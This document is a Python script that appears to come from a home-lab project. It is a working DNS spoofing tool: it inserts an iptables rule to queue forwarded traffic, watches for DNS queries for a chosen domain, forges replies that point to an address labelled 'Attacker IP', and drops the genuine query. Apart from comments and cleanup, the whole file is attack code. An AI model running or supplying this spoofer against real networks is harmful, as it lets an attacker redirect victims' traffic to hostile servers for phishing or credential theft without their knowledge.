#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
import netfilterqueue
import sys
import os

# Configuration
target_ip = "192.168.56.254"
gateway_ip = "192.168.56.1"
spoof_domain = "manny.com." # The domain to be spoofed (note the trailing dot)
spoof_ip = "192.168.56.102"    # The IP to be redirected to (Attacker IP)

def dns_spoof(pkt):
    # Convert the NetfilterQueue packet into a Scapy packet
    scapy_pkt = IP(pkt.get_payload())
    
    # Check if it's a DNS query and has the DNS Question Record layer
    if scapy_pkt.haslayer(DNSQR):
        qname = scapy_pkt[DNSQR].qname.decode()
        # --- DEBUG LINE: Add this to see all queries ---
        print(f"[DEBUG] Saw DNS Query for: {qname}")
        # -------------------------------------------------
        if spoof_domain in qname:
            print(f"[+] Spoofing DNS response for {qname}")
            
            # Craft the fake DNS answer
            spoofed_answer = DNSRR(
                rrname=qname,
                type='A',
                rclass='IN',
                ttl=600,
                rdata=spoof_ip
            )
            
            # Build the response packet
            # Swap source and destination IPs/Ports to make it a response
            response = IP(dst=scapy_pkt[IP].src, src=scapy_pkt[IP].dst) / \
                       UDP(dport=scapy_pkt[UDP].sport, sport=53) / \
                       DNS(
                           id=scapy_pkt[DNS].id,      # Match the query ID
                           qr=1,                      # 1 = Response
                           qd=scapy_pkt[DNS].qd,      # Original Question
                           an=spoofed_answer          # Our fake answer
                       )
            
            # Send the crafted response
            send(response, verbose=0)
            
            # Optionally, drop the original query so the real server never sees it
            pkt.drop()
            return
            
    # If it's not our target domain, just accept the packet to let it through
    pkt.accept()

# Main execution
try:
    print(f"[+] Starting DNS Spoofer for domain {spoof_domain} -> {spoof_ip}")
    print("[+] Forwarding packets to NetfilterQueue...")
    
    # !!! IMPORTANT: Setup IPTables rule to trap packets
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0 -m comment --comment \"DNS_Spoof_Project\"")
    # For testing on the same machine: os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0 && iptables -I INPUT -j NFQUEUE --queue-num 0")
    
    # Bind to the queue and start processing
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, dns_spoof)
    queue.run()

except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C ... Safely removing project iptables rules.")
    # SAFE CLEANUP: Only delete the specific rules this script created, based on their unique comment.
    # The '2>/dev/null' hides any error messages if the rule doesn't exist (making cleanup idempotent).
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 0 -m comment --comment \"DNS_Spoof_Project\" 2>/dev/null")
    os.system("iptables -D OUTPUT -j NFQUEUE --queue-num 0 -m comment --comment \"DNS_Spoof_Project\" 2>/dev/null")
    os.system("iptables -D INPUT -j NFQUEUE --queue-num 0 -m comment --comment \"DNS_Spoof_Project\" 2>/dev/null")
    print("[+] iptables rules cleaned up. Exiting.")
    sys.exit(0)
